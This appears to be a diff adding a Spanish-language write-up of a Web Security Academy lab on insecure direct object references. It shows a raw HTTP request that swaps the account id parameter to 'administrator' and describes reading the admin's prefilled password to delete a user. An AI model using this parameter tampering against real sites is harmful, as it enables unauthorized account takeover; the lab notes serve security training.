@@ -195,13 +195,35 @@ Connection: close
 
 
 
+#  User ID controlled by request parameter with password disclosure
+
+Para este lab de nueva cuenta podemos cambiar el usuario al que se realiza la peticion si miramos
+tienen el password rellenado esto se puede quitar desde el dev tools del navegador
+o ver el codigo lo que se hace es poner el pass del administrador
+y eliminar el usuario carlos
+
+```
+GET /my-account?id=administrator HTTP/1.1
+Host: 0a4d00b704d9ebd2c0b9f7ce00ea0030.web-security-academy.net
+Cookie: session=UmvTPHD4HngwQx1MAP9XJAaZKEMvi0Ae
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a4d00b704d9ebd2c0b9f7ce00ea0030.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
 
 
 
-
-
-
-
+```
 
 
 
